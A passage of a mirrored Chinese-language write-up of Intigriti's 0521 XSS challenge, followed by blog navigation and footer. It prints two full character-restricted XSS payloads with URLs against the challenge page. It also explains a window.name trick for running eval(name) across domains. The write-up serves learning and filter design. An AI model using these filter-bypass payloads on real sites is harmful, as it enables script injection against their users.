+  <p>最後呢，因為我們不需要執行任意程式碼了，所以用 alert(document.domain) 就好，至於 eval(name) 的話雖然乍看之下更短，但因為要拿到 v 不容易，所以其實會花費更多字元。</p>
+  <p>底下是產生出來的結果，長度 466 個字：</p>
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>length: 466======= Payload =======[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`][`${e}`[5]+`${e}`[1]+`${e}`[25]+`${e}`[18]+`${e}`[6]+`${e}`[13]+`${e[0]}`[0]+`${e}`[5]+`${e}`[6]+`${e}`[1]+`${e}`[13]]`_${`${0/0}`[1]+`${e}`[21]+`e`+`${e}`[13]+`${e}`[6]+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[13]+`${e[0]}`[2]+`${e}`[1]+`${e}`[5]+`${e[0]}`[0]+`${e}`[23]+`e`+`${e}`[25]+`${e}`[6]+`.`+`${e[0]}`[2]+`${e}`[1]+`${e}`[23]+`${0/0}`[1]+`${e[0]}`[5]+`${e}`[25]+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[14]}`` `======= URL =======https://challenge-0521.intigriti.io/captcha.php?c=[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`][`${e}`[5]%2b`${e}`[1]%2b`${e}`[25]%2b`${e}`[18]%2b`${e}`[6]%2b`${e}`[13]%2b`${e[0]}`[0]%2b`${e}`[5]%2b`${e}`[6]%2b`${e}`[1]%2b`${e}`[13]]`_${`${0/0}`[1]%2b`${e}`[21]%2b`e`%2b`${e}`[13]%2b`${e}`[6]%2b`${[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`]}`[13]%2b`${e[0]}`[2]%2b`${e}`[1]%2b`${e}`[5]%2b`${e[0]}`[0]%2b`${e}`[23]%2b`e`%2b`${e}`[25]%2b`${e}`[6]%2b`.`%2b`${e[0]}`[2]%2b`${e}`[1]%2b`${e}`[23]%2b`${0/0}`[1]%2b`${e[0]}`[5]%2b`${e}`[25]%2b`${[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`]}`[14]}```</code></pre></div>  </div>
+  <h3 id="section-5">再次縮短</h3>
+  <p>把上面的結果拿去平台上 submit 之後，作者說目前看到最短的是 376 個字元。我想了一陣子發現想不太到，然後就靈機一動想說：「那來試試看 v 那個方法好了，先不管瀏覽器問題」</p>
+  <p>幫大家回顧一下瀏覽器問題是什麼，那問題就是如果想用 function to string 的方式拿到 v，Chrome 跟 Firefox 產生的結果不同：</p>
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[]['some']+''// Chrome"function some() { [native code] }"v: index 23// Firefox"function some() {    [native code]}"v: index 27</code></pre></div>  </div>
+  <p>所以同一個 payload 無法同時應用在這兩個網頁上面。</p>
+  <p>先不管這問題的話，產生出來的結果是這樣：</p>
+  <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>length: 376======= Payload =======[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`][`${e}`[5]+`${e}`[1]+`${e}`[25]+`${e}`[18]+`${e}`[6]+`${e}`[13]+`${e[0]}`[0]+`${e}`[5]+`${e}`[6]+`${e}`[1]+`${e}`[13]]`_${`e`+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[23]+`${0/0}`[1]+`${e}`[21]+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[13]+`${e}`[25]+`${0/0}`[1]+`${e}`[23]+`e`+`${[][`${e}`[18]+`${e}`[1]+`${e}`[23]+`e`]}`[14]}`` `======= URL =======https://challenge-0521.intigriti.io/captcha.php?c=[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`][`${e}`[5]%2b`${e}`[1]%2b`${e}`[25]%2b`${e}`[18]%2b`${e}`[6]%2b`${e}`[13]%2b`${e[0]}`[0]%2b`${e}`[5]%2b`${e}`[6]%2b`${e}`[1]%2b`${e}`[13]]`_${`e`%2b`${[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`]}`[23]%2b`${0/0}`[1]%2b`${e}`[21]%2b`${[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`]}`[13]%2b`${e}`[25]%2b`${0/0}`[1]%2b`${e}`[23]%2b`e`%2b`${[][`${e}`[18]%2b`${e}`[1]%2b`${e}`[23]%2b`e`]}`[14]}```</code></pre></div>  </div>
+  <p>376 個字，跟剛剛的 466 比起來少了快一百個。</p>
+  <p>用來產生的完整程式碼：</p>
+  <iframe src="" width="0" height="0" frameborder="0" scrolling="no">
+<a href="https://medium.com/media/45d22771ad7e8800d17bf05333e98f6a/href">https://medium.com/media/45d22771ad7e8800d17bf05333e98f6a/href</a>
+  </iframe>
+  <p>有些人可能不知道為什麼 eval(name) 可以，這是因為 window.name 是個神奇的屬性，基本上同一個分頁的 name 會相同，所以我們只要自己新建一個 html，裡面寫 JS 並且設定 window.name = 'alert(document.domain)'，然後用 location= 跳轉到 PHP 那邊，那裡的 name 就會是我們剛剛設定好的。</p>
+  <p>沒錯，跨網域也適用。</p>
+  <p>因為我最後試出來的結果也是 376 個字，跟作者說的最短 payload 相同，詢問過後發現其實就是同一個。</p>
+  <h3 id="section-6">結語</h3>
+  <p>從這個挑戰中可以學到一些 JS 相關的東西，像是：</p>
+  <ol>
+    <li>在限制之下湊出指定字元</li>
+    <li>用反引號 backtick 來呼叫函式以及參數的規則</li>
+    <li>用 function constructor 動態建立函式</li>
+  </ol>
+  <p>這些知識在什麼時候會有用呢？對攻擊者而言，當你碰到一個有過濾字元的地方的時候，就可以利用這些技巧想辦法繞過限制。</p>
+  <p>對防禦方來說，在過濾時就需要考量到這些繞過的方法，如果知道可以這樣繞過，就能把 filter 訂得更精確。</p>
+  <p>不過這都只是後話，對我來說會解這些題目只是因為好玩，也沒有去想說會有什麼幫助，那些都是以後的事了。</p>
+  <p>這個平台每個月都會有 XSS 挑戰，期待之後的更多挑戰！</p>
+<img src="https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=b859a65acc48" width="1" height="1" alt="" />  <hr />
+  <p><a href="https://medium.com/cymetrics/intigritis-0521-xss-challenge-writeup-b859a65acc48">Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼</a> was originally published in <a href="https://medium.com/cymetrics">Cymetrics tech blog</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>
+</div>
+
+  </div>
+
+  <hr style="border-top:1px solid #28323C;"/>
+
+<font size=2px>
+  文章版权归原作者所有。
+</font>
+
+<div style="text-align:center"><img width="1px" src="https://i.imgur.com/RinUcXm.png" alt="二维码分享本站" style="text-align:center"/></div>
+
+  <div id="sametag">
+    <h4 style="display: inline-block;">#medium 的其它文章</h4>
+    <span>--<a href="https://nodebe4.github.io/oped2/2021-07-09/%E7%82%BA%E4%BB%80%E9%BA%BC%E5%BF%98%E8%A8%98%E5%AF%86%E7%A2%BC%E6%99%82%E5%8F%AA%E8%83%BD%E9%87%8D%E8%A8%AD-%E4%B8%8D%E6%8A%8A%E8%88%8A%E5%AF%86%E7%A2%BC%E5%91%8A%E8%A8%B4%E6%88%91/">最新</a>-</span>
+    <span>-<a href="https://nodebe4.github.io/oped2/2014-08-27/A-Letter-to-My-Former-Family-From-a-Shelter-Cat/">最早</a>--</span>
+    
+      <li>
+        <time>2021-06-25</time>
+        <a href="https://nodebe4.github.io/oped2/2021-06-25/%E7%B0%A1%E5%96%AE%E4%BB%8B%E7%B4%B9%E7%99%BC%E5%B8%83-Medium-%E6%96%87%E7%AB%A0%E5%89%8D%E5%8F%AF%E4%BB%A5%E6%94%B9%E7%9A%84%E6%9D%B1%E8%A5%BF/">
+          簡單介紹發布 Medium 文章前可以改的東西
+        </a>
+      </li>
+    
+    
+      <li>
+        <time>2021-06-17</time>
+        <a href="https://nodebe4.github.io/oped2/2021-06-17/%E6%B7%BA%E8%AB%87-XSS-%E6%94%BB%E6%93%8A%E8%88%87%E9%98%B2%E7%A6%A6%E7%9A%84%E5%90%84%E5%80%8B%E7%92%B0%E7%AF%80/">
+          淺談 XSS 攻擊與防禦的各個環節
+        </a>
+      </li>
+    
+    
+      <li>
+        <time>2021-06-05</time>
+        <a href="https://nodebe4.github.io/oped2/2021-06-05/%E6%9A%AB%E5%88%A5%E5%89%8D%E7%AB%AF-%E9%87%8D%E6%96%B0%E9%96%8B%E5%A7%8B/">
+          暫別前端，重新開始
+        </a>
+      </li>
+    
+    
+      <li>
+        <time>2021-05-15</time>
+        <a href="https://nodebe4.github.io/oped2/2021-05-15/%E9%98%B2%E6%AD%A2-XSS-%E5%8F%AF%E8%83%BD%E6%AF%94%E6%83%B3%E5%83%8F%E4%B8%AD%E5%9B%B0%E9%9B%A3/">
+          防止 XSS 可能比想像中困難
+        </a>
+      </li>
+    
+  </div>
+
+
+  <hr>
+  <div class="pagination">
+    
+      <span class="prev" >
+          <a href="https://nodebe4.github.io/oped2/2021-06-07/%E5%9C%A8%E6%AF%92%E5%93%81%E5%92%8C%E9%BB%91%E5%B8%AE%E4%B9%8B%E5%A4%96-%E6%8B%89%E4%B8%81%E7%BE%8E%E6%B4%B2%E8%BF%98%E6%9C%89%E5%93%AA%E4%BA%9B%E9%AD%94%E5%B9%BB%E5%8F%B2/">
+            前一篇：在毒品和黑帮之外，拉丁美洲还有哪些魔幻史？
+          </a>
+      </span>
+    
+    
+      <span class="next" >
+          <a href="https://nodebe4.github.io/oped2/2021-06-07/%E4%B8%AD%E5%9B%BD%E7%9A%84-%E6%96%B0%E7%96%86%E6%A8%A1%E5%BC%8F-%E5%A6%82%E4%BD%95%E5%80%9F%E9%89%B4%E7%BE%8E%E5%9B%BD-%E8%8B%B1%E5%9B%BD%E5%92%8C%E4%BB%A5%E8%89%B2%E5%88%97%E7%9A%84%E5%B9%B3%E5%8F%9B%E6%88%98%E7%95%A5-iYouPort/">
+            後一篇：中国的 新疆模式 如何借鉴美国、英国和以色列的平叛战略 - iYouPort
+          </a>
+      </span>
+    
+
+    <script>
+    /* post pagination keyboard shortcuts */
+    document.body.onkeyup = function(e){
+      if (e.keyCode == '37') { window.location = 'https://nodebe4.github.io/oped2/2021-06-07/%E5%9C%A8%E6%AF%92%E5%93%81%E5%92%8C%E9%BB%91%E5%B8%AE%E4%B9%8B%E5%A4%96-%E6%8B%89%E4%B8%81%E7%BE%8E%E6%B4%B2%E8%BF%98%E6%9C%89%E5%93%AA%E4%BA%9B%E9%AD%94%E5%B9%BB%E5%8F%B2/'; } // left arrow key
+      if (e.keyCode == '39') { window.location = 'https://nodebe4.github.io/oped2/2021-06-07/%E4%B8%AD%E5%9B%BD%E7%9A%84-%E6%96%B0%E7%96%86%E6%A8%A1%E5%BC%8F-%E5%A6%82%E4%BD%95%E5%80%9F%E9%89%B4%E7%BE%8E%E5%9B%BD-%E8%8B%B1%E5%9B%BD%E5%92%8C%E4%BB%A5%E8%89%B2%E5%88%97%E7%9A%84%E5%B9%B3%E5%8F%9B%E6%88%98%E7%95%A5-iYouPort/'; } // right arrow key
+      if (e.keyCode == '45') { window.location = 'https://nodebe4.github.io/oped2/2021-06-17/%E6%B7%BA%E8%AB%87-XSS-%E6%94%BB%E6%93%8A%E8%88%87%E9%98%B2%E7%A6%A6%E7%9A%84%E5%90%84%E5%80%8B%E7%92%B0%E7%AF%80/'; } // insert key
+      if (e.keyCode == '46') { window.location = 'https://nodebe4.github.io/oped2/2021-06-05/%E6%9A%AB%E5%88%A5%E5%89%8D%E7%AB%AF-%E9%87%8D%E6%96%B0%E9%96%8B%E5%A7%8B/'; } // delete key
+    };
+    </script>
+    <link rel="stylesheet" type="text/css" href="/oped2/assets/css/fab.css" />
+
+<div class="fab-wrapper">
+  <div class="fab-wheel">
+    
+    
+    
+    <a class="fab-action fab-action-1" title="上一篇(热键 &#8594;)" href="https://nodebe4.github.io/oped2/2021-06-07/%E5%9C%A8%E6%AF%92%E5%93%81%E5%92%8C%E9%BB%91%E5%B8%AE%E4%B9%8B%E5%A4%96-%E6%8B%89%E4%B8%81%E7%BE%8E%E6%B4%B2%E8%BF%98%E6%9C%89%E5%93%AA%E4%BA%9B%E9%AD%94%E5%B9%BB%E5%8F%B2/">
+      <i>后</i>
+    </a>
+    
+    
+    <a class="fab-action fab-action-2" title="下一篇(热键 &#8592;)" href="https://nodebe4.github.io/oped2/2021-06-07/%E4%B8%AD%E5%9B%BD%E7%9A%84-%E6%96%B0%E7%96%86%E6%A8%A1%E5%BC%8F-%E5%A6%82%E4%BD%95%E5%80%9F%E9%89%B4%E7%BE%8E%E5%9B%BD-%E8%8B%B1%E5%9B%BD%E5%92%8C%E4%BB%A5%E8%89%B2%E5%88%97%E7%9A%84%E5%B9%B3%E5%8F%9B%E6%88%98%E7%95%A5-iYouPort/">
+      <i>前</i>
+    </a>
+    
+    
+    <a class="fab-action fab-action-3" title="<medium>上一篇(热键 ins)" href="https://nodebe4.github.io/oped2/2021-06-17/%E6%B7%BA%E8%AB%87-XSS-%E6%94%BB%E6%93%8A%E8%88%87%E9%98%B2%E7%A6%A6%E7%9A%84%E5%90%84%E5%80%8B%E7%92%B0%E7%AF%80/">
+      <i>左</i>
+    </a>
+    
+    
+    <a class="fab-action fab-action-4" title="<medium>下一篇(热键 del)" href="https://nodebe4.github.io/oped2/2021-06-05/%E6%9A%AB%E5%88%A5%E5%89%8D%E7%AB%AF-%E9%87%8D%E6%96%B0%E9%96%8B%E5%A7%8B/">
+      <i>右</i>
+    </a>
+    
+  </div>
+</div>
+
+
+  </div>
+
+
+  
+
+</article>
+
+    </div>
+
+    <div style="z-index:2;">
+<script src="/oped2/assets/js/vanilla-back-to-top.min.js"></script>
+<script>addBackToTop({
+  diameter: 56,
+  cornerOffset: 20, // px
+  id: 'back-to-top',
+  backgroundColor: '#ddd',
+  textColor: 'red'
+})</script>
+</div>
+
+
+    <div class="wrapper-footer" id="footer">
+      <div class="container">
+        <footer class="footer">
+          <img width="200px" src="https://i.imgur.com/RinUcXm.png" alt="二维码分享本站"/>
+<font size=2px>二维码分享本站</font>
+
+<!-- Refer to https://codepen.io/ruandre/pen/howFi -->
+<ul class="svg-icon">
+
+  
+
+  
+
+  
+  <li><a href="mailto:beauti4@protonmail.com" class="icon-8 email" title="Email"><svg viewBox="0 0 512 512"><path d="M101.3 141.6v228.9h0.3 308.4 0.8V141.6H101.3zM375.7 167.8l-119.7 91.5 -119.6-91.5H375.7zM127.6 194.1l64.1 49.1 -64.1 64.1V194.1zM127.8 344.2l84.9-84.9 43.2 33.1 43-32.9 84.7 84.7L127.8 344.2 127.8 344.2zM384.4 307.8l-64.4-64.4 64.4-49.3V307.8z"/></svg><!--[if lt IE 9]><em>Email</em><![endif]--></a></li>
+  
+
+  
+
+  
+
+  
+  <li><a href="https://github.com/NodeBE4/oped2" class="icon-13 github" title="GitHub"><svg viewBox="0 0 512 512"><path d="M256 70.7c-102.6 0-185.9 83.2-185.9 185.9 0 82.1 53.3 151.8 127.1 176.4 9.3 1.7 12.3-4 12.3-8.9V389.4c-51.7 11.3-62.5-21.9-62.5-21.9 -8.4-21.5-20.6-27.2-20.6-27.2 -16.9-11.5 1.3-11.3 1.3-11.3 18.7 1.3 28.5 19.2 28.5 19.2 16.6 28.4 43.5 20.2 54.1 15.4 1.7-12 6.5-20.2 11.8-24.9 -41.3-4.7-84.7-20.6-84.7-91.9 0-20.3 7.3-36.9 19.2-49.9 -1.9-4.7-8.3-23.6 1.8-49.2 0 0 15.6-5 51.1 19.1 14.8-4.1 30.7-6.2 46.5-6.3 15.8 0.1 31.7 2.1 46.6 6.3 35.5-24 51.1-19.1 51.1-19.1 10.1 25.6 3.8 44.5 1.8 49.2 11.9 13 19.1 29.6 19.1 49.9 0 71.4-43.5 87.1-84.9 91.7 6.7 5.8 12.8 17.1 12.8 34.4 0 24.9 0 44.9 0 51 0 4.9 3 10.7 12.4 8.9 73.8-24.6 127-94.3 127-176.4C441.9 153.9 358.6 70.7 256 70.7z"/></svg><!--[if lt IE 9]><em>GitHub</em><![endif]--></a></li>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <li><a href="/oped2/feed.xml" class="icon-21 rss" title="RSS"><svg viewBox="0 0 512 512"><path d="M201.8 347.2c0 20.3-16.5 36.8-36.8 36.8 -20.3 0-36.8-16.5-36.8-36.8s16.5-36.8 36.8-36.8C185.3 310.4 201.8 326.8 201.8 347.2zM128.2 204.7v54.5c68.5 0.7 124 56.3 124.7 124.7h54.5C306.7 285.3 226.9 205.4 128.2 204.7zM128.2 166.6c57.9 0.3 112.3 22.9 153.2 63.9 41 41 63.7 95.5 63.9 153.5h54.5c-0.3-149.9-121.7-271.4-271.6-271.9V166.6L128.2 166.6z"/></svg><!--[if lt IE 9]><em>RSS</em><![endif]--></a></li>
+  
+
+  
+
+  
+
+  
+
+  
+
+    
+</ul>
+
+
+
+
+
+<p><span style="color:blue">内容每小时更新一次.</span> Powered by <a href="https://github.com/AWEEKJ/kiko-now">Kiko Now</a> & <a href="https://github.com/gitalk/gitalk">Gitalk</a> & <a href="https://github.com/duty-machine/news">duty-machine</a>, 站务 <a href="https://be4.herokuapp.com">NodeBE4</a>（<span style="color:red">被墙</span>）</p>
+
+
+        </footer>
+      </div>
+    </div>
+
+    
+
+
+
+  </body>
+</html>
